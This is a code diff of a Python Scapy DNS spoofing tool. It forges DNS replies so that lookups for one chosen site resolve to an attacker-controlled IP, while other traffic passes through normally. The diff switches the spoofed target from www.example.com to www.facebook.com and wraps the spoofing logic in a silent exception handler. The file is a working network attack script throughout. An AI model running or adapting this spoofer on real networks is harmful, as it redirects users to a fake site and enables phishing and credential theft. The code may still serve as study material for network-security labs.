@@ -7,11 +7,11 @@ RESPONSE = 1
 my_own_ip = get_if_addr(IFACE)
 
 # Server Flags
-DNS_SERVER = "192.168.122.1"
+DNS_SERVER = "172.16.81.1"
 
 # Attacker Flags
-MALICIOUS_SITE = b"www.example.com."
-MALICIOUS_IP = "192.168.2.100"
+MALICIOUS_SITE = b"www.facebook.com."
+MALICIOUS_IP = "93.184.216.34"
 
 
 def dns_pkt_filter(pkt):
@@ -28,32 +28,35 @@ def dns_pkt_filter(pkt):
 
 def dns_reply(pkt):
 	""" Reply the client with the Fake DNS Reply """
-	
-	# Retrieve the DNS Question Name
-	qname = pkt[DNSQR].qname
-	
-	# Let user browse through normal traffic
-	if qname != MALICIOUS_SITE:
-		dns_req = IP(dst=DNS_SERVER) \
-				/ UDP(dport=53) \
-				/ DNS(rd=1, qd=DNSQR(qname=qname))
+	try:
+		# Retrieve the DNS Question Name
+		qname = pkt[DNSQR].qname
 		
-		ans = sr1(dns_req, verbose=0)
-		domain_ip = ans[DNSRR].rdata
-	
-	# User tries to access the site we want to spoof
-	else:
-		domain_ip = MALICIOUS_IP
-	
-	spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
-				/ UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) \
-				/ DNS(id=pkt[DNS].id, \
-					qr=RESPONSE, \
-					qd=pkt[DNS].qd, \
-					an=DNSRR(rrname=qname, type='A', ttl=124, rdata=domain_ip), \
-					ancount=1)
+		# Let user browse through normal traffic
+		if qname != MALICIOUS_SITE:
+			dns_req = IP(dst=DNS_SERVER) \
+					/ UDP(dport=53) \
+					/ DNS(rd=1, qd=DNSQR(qname=qname))
+			
+			ans = sr1(dns_req, verbose=0)
+			domain_ip = ans[DNSRR].rdata
+		
+		# User tries to access the site we want to spoof
+		else:
+			domain_ip = MALICIOUS_IP
+		
+		spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
+					/ UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) \
+					/ DNS(id=pkt[DNS].id, \
+						qr=RESPONSE, \
+						qd=pkt[DNS].qd, \
+						an=DNSRR(rrname=qname, type='A', ttl=124, rdata=domain_ip), \
+						ancount=1)
 
-	send(spoofed_pkt)
+		send(spoofed_pkt)
+	
+	except:
+		pass
 
 
 def main():
